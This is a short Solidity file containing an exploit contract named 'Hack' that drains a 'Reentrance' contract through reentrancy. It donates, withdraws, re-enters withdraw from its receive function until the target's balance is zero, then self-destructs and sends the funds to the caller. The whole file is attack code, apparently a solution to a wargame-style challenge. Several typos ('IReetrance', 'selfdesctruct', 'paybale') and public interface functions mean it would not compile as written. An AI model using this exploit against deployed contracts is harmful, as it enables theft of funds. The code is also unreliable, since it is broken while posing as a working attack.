// SPDX-License-Identifier:   MIT
pragma solidity ^0.8.0;

interface IReentrance {
  function donate(address) public payable;
  function withdraw(uint256) public;
}
contract Hack {
  IReetrance private immutable target;

  constructor(address _target){
    target = IReetrance(_target);
  }

  function attack() external payable {
    target.donate{value: 1e18}(address(this));
    target.withdraw(1e18);
    require(address(target).balance == 0,"target balance >0");
    selfdesctruct(paybale(msg.sender));
  }

  receive() external paybale {
    uint prize = min(1e18,address(target).balance);
    if(prize > 0){
    target.withdraw(prize);
    }
  }

  function min(uint x,uint y) private pure returns(uint) {
     return x<=y ? x:y;
  }
}
